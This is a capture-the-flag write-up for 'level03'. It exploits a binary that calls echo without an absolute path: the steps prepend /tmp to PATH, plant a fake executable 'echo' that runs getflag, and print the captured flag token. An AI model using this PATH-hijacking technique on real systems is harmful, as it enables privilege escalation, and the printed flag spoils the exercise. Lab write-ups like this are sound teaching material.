# Level03

## Objective
Exploit the non-absolute path in the `level03` program to execute the `getflag` command and retrieve the flag.

## Steps

### Step 1: Identify Vulnerability
Use the `strings` command on `level03` to identify the command being executed:

```bash
strings level03 | grep Exploit
```

Result:
```plaintext
/usr/bin/env echo Exploit me
```

### Step 2: Manipulate PATH
Add `/tmp` to the beginning of the `$PATH` environment variable:

```bash
export PATH=/tmp:$PATH
```

### Step 3: Create Fake `echo` Command
Create a fake `echo` command in `/tmp` that contains the `getflag` command:

```bash
echo "getflag" > /tmp/echo
```

### Step 4: Provide Execution Rights
Give execution rights to the fake `echo` command:

```bash
chmod +x /tmp/echo
```

### Step 5: Execute `level03`
Run `./level03` to execute the manipulated command:

```bash
./level03
```

You should see the flag:

```plaintext
Check flag. Here is your token: qi0maab88jeaj46qoumi7maus
```

Congratulations! You've successfully exploited the vulnerability in `level03` and obtained the flag.